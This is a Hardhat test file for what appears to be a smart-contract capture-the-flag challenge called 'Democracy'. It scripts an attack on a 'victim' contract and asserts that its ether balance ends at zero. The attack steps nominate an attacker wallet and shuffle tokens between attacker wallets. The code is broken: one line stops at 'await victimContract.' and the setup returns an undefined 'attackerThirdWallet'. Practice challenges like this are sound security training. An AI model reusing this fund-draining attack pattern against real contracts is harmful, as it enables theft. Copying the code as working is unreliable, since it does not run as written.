const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
  async function setup() {
      const [owner, attackerWallet, attackerSecondWallet] = await ethers.getSigners();
      const value = ethers.utils.parseEther("1");

      const VictimFactory = await ethers.getContractFactory(NAME);
      const victimContract = await VictimFactory.deploy({ value });

      return { victimContract, attackerWallet, attackerSecondWallet, attackerThirdWallet };
  }

  describe("exploit", async function () {
      let victimContract, attackerWallet, attackerSecondWallet;
      before(async function () {
          ({ victimContract, attackerWallet, attackerSecondWallet } = await loadFixture(setup));
      })

      it("conduct your attack here", async function () {
          await victimContract.nominateChallenger(attackerWallet.address);
          await victimContract.
          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerSecondWallet.address, 1);
          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerSecondWallet.address, 2);
      });

      after(async function () {
          const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
          expect(victimContractBalance).to.be.equal('0');
      });
  });
});